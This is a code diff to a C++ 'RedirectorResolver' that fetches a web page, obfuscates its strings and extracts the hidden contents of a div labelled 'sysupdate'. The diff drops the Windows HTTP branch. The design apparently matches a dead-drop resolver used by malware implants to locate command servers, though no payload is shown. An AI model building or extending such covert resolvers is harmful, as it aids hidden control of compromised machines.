@@ -1,15 +1,12 @@
 #include "RedirectorResolver.h"
-#ifdef _WIN32
-#include "WinHttpClient.h"
-#else
 #include "HttpClient.h"
-#include <iostream>
-#endif
 #include "../core/Config.h"
 #include "../utils/Obfuscator.h"
 #include "../utils/Logger.h"
 #include <regex>
 #include <stdexcept>
+#include <cstdlib>
+
 namespace http {
 RedirectorResolver::RedirectorResolver(const std::string& redirectorUrl) : redirectorUrl_(redirectorUrl) {}
 std::string RedirectorResolver::resolve() {
@@ -20,22 +17,15 @@ std::string RedirectorResolver::resolve() {
         server = urlMatch[1].str();
         path = urlMatch[2].str();
     } else throw std::runtime_error(OBF("Failed to parse redirector URL: ") + redirectorUrl_);
+
     std::string html;
-#ifdef _WIN32
-    std::wstring wserver(server.begin(), server.end());
-    std::wstring wpath(path.begin(), path.end());
-    WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
-    html = client.get(wserver, wpath);
-#else
     HttpClient client(core::USER_AGENTS[0]);
     html = client.get(server, path);
-#endif
 
     if (getenv("CI")) {
         LOG_INFO("Redirector response body size: " + std::to_string(html.size()));
     }
 
-    // Use a more relaxed regex for finding the div
     std::regex divRegex("id\\s*=\\s*[\"']sysupdate[\"'][^>]*>([\\s\\S]*?)</div>", std::regex::icase);
     std::smatch match;
     if (!std::regex_search(html, match, divRegex)) {
